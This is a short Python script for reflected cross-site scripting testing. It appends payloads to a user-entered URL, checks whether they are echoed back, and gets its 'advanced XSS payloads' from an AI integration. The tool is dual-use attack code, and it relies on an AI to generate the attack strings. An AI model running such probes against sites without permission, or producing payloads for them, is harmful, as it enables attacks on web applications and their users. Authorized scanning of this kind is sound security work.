import requests
from bs4 import BeautifulSoup
from urllib.parse import quote

# Shared dependencies
from utils.constants import INJECTION_VECTORS, USER_ACTIVITY_LOGS
from utils.helpers import log_activity, generate_random_string
from ai_integration import query_ai_for_payload

# Function to perform XSS injection
def perform_xss_injection(target_url, payload):
    try:
        # Prepare the attack vector with the payload
        attack_vector = target_url + quote(payload)
        response = requests.get(attack_vector)
        
        # Check if the payload is reflected in the response content
        if payload in response.text:
            log_activity(USER_ACTIVITY_LOGS, f"XSS injection successful at {target_url}", "ExploitSuccessMsg")
            return True
        else:
            log_activity(USER_ACTIVITY_LOGS, f"XSS injection failed at {target_url}", "ExploitFailMsg")
            return False
    except Exception as e:
        log_activity(USER_ACTIVITY_LOGS, f"XSS injection error at {target_url}: {str(e)}", "ExploitErrorMsg")
        return False

# Function to generate XSS payloads using AI
def generate_xss_payloads():
    # Query the AI for advanced XSS payloads
    ai_payloads = query_ai_for_payload("xss")
    return ai_payloads

# Function to test for XSS vulnerabilities
def test_for_xss_vulnerability(target_url, test_payloads):
    for payload in test_payloads:
        if perform_xss_injection(target_url, payload):
            return True
    return False

# Main function to orchestrate the XSS injection process
def main():
    target_url = input("Enter the target URL for XSS testing: ")
    print("Generating advanced XSS payloads...")
    xss_payloads = generate_xss_payloads()
    
    print("Testing for XSS vulnerabilities...")
    if test_for_xss_vulnerability(target_url, xss_payloads):
        print(f"XSS vulnerability found at {target_url}")
    else:
        print(f"No XSS vulnerabilities found at {target_url}")

if __name__ == "__main__":
    main()